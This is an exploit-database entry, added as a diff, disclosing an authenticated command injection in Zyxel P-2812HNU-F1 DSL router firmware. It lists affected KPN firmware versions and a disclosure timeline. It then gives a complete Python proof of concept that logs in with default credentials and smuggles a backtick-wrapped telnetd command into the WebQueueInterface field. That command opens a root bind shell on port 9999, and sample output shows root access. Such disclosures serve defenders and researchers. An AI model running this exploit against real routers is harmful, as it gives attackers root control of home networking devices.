@@ -1,0 +1,98 @@
+id: 28705
+date: 09/30/2017
+title: Zyxel P-2812HNU-F1 DSL Router Command Injection Vulnerability
+author: Willem de Groot
+cves: 
+
+Zyxel P-2812HNU-F1 DSL router - command injection
+=================================================
+The Zyxel P-2812 is common in the Netherlands (KPN/Telfort) and Norway
+(Telenor). The Dutch firmware is susceptible to authenticated command
+injection
+through `qos_queue_add.cgi` and the `WebQueueInterface` parameter.
+
+Affected firmware versions
+==========================
+V3.11TUE3 (KPN)
+V3.11TUE8 (KPN)
+
+Not affected
+============
+BLN.18 and up (Telenor)
+
+Disclosure timeline
+===================
+2017-02-05 Notified cert@kpn-cert.nl
+2017-02-11 Notified cert@telenor.net
+2017-02-15 KPN: "escalated to Zyxel"
+2017-02-23 Telenor: "we have fixed this previously in BLN18"
+2017-09-28 Public disclosure
+
+Proof of concept code
+=====================
+Sample code at
+http://gwillem.gitlab.io/2017/09/28/hacking-the-zyxel-p-2812hnu-f1/
+
+#!/usr/bin/env python3 
+# 2017-02-03 gwillem@gmail.com
+
+import requests
+import re
+
+USER = 'user'
+PASS = '1234'
+URL = 'http://192.168.1.254/'
+CMD = '/sbin/telnetd -l/bin/sh -p9999 &'
+
+s = requests.Session()
+s.post(URL + 'login.cgi', data=dict(
+    UserName=USER, 
+    password=PASS,
+    hiddenPassword=PASS,
+    submitValue='1'))
+r = s.get(URL + 'fileuser_mod.cgi')
+assert 'sessionKey' in r.text, r.text
+
+sessionkey = re.search("gblsessionKey = '(.+?)'", r.text).group(1)
+assert len(sessionkey) > 24, sessionkey
+
+r = s.post(URL + 'qos_queue_add.cgi', data=dict(
+        Submit='Apply',
+        QueueObjectIndex='15',
+        QueueNameTxt='test',
+        WebQueueInterface='WAN`%s`' % CMD,
+        WebQueuePriority='1',
+        WebQueueWeight='1',
+        sessionKey=sessionkey,
+    ))
+
+if "window.parent.document.activePage('network-qos',1)" in r.text:
+    print("Success, root shell at port 9999")
+else:
+    print("Did not work, see output:\n" + r.text)
+
+Working?
+
+$ ./open-sesame.py
+Success!
+$ telnet 192.168.1.1 9999
+Trying 192.168.1.1...
+Connected to 192.168.1.1.
+Escape character is '^]'.
+# id
+uid=0(root) gid=0(root)
+
+
+
+Observations
+============
+Security fixes for branded Zyxel firmware are not necessarily implemented
+by all OEM clients.
+
+
+--
+Willem de Groot
+https://twitter.com/gwillem
+https://gwillem.gitlab.io
+
+#  0day.today [2023-03-23]  #
